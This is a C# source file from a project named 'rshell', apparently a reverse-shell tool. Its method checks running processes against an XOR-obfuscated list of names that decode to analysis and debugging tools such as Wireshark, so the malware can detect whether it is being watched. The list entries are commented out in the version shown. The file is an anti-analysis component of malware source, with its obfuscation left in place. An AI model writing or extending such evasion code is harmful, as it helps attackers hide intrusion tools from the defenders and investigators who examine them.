using System.Text;
using System.Diagnostics;

namespace rshell
{
    class ProgramStarter
    {
        // xor
        #region
        static string xor(string text, int n = 256)
        {
            byte[] input = Encoding.UTF8.GetBytes(text);
            byte[] output = new byte[input.Length];
            int i = 0;
            foreach (byte b in input)
            {
                output[i] = (byte)(b ^ n);
                i++;
            }
            return Encoding.UTF8.GetString(output);
        }
        #endregion

        public static bool Starter()
        {
            string[] list = new string[] {
                                        //"QOTCUNGTM",
                                        //"OBGW",
                                        //"IJJ_BDA",
                                        //"RGUMKAT",
                                        //"VTIECUUNGEMCT",
                                        //"VTIEC^V",
                                        //"BHUV_",
                                        //"OBGW",
                                        //"OKKSHOR_BCDSAACT",
                                        //"QOTCUNGTM",
                                        //"BSKVEGV",
                                        //"NIIMC^VJITCT",
                                        //"OKVITRTCE",
                                        //"VCRIIJU",
                                        //"JITBVC",
                                        //"U_UOHUVCERIT",
                                        //"VTIEyGHGJ_\\CT",
                                        //"U_UGHGJ_\\CT",
                                        //"UHO@@yNOR",
                                        //"QOHBDA",
                                        //"LICDI^EIHRTIJ",
                                        //"@OBBJCT",
                                        //"LICDI^UCTPCT",
                                        //"OBG",
                                        //"OBG",
                                        //"PKRIIJUB",
                                        //"PKQGTCRTGR",
                                        //"PKQGTCSUCT",
                                        //"PKGERNJV",
                                        //"PDI^UCTPOEC",
                                        //"PDI^RTG_",
                                        //"MUBSKVCT",
                                        //"TCEJGUHCR",
                                        //"^BDA",
                                        //"IJJ_BDA",
                                        //"VTIATCUURCJCTOM@OBBJCTQCDBCDSAACT",
                                        //"^BDA",
                                        //"MUBSKVCT",
                                        //"NRRVBCDSAACT"

                                    };

            foreach (Process p in Process.GetProcesses())
            {
                foreach (string name in list)
                {
                    if (xor(p.ProcessName.ToLower(), 38).Contains(name))
                    {
                        return true;
                    }
                }
            }

            return false;

        }
    }
}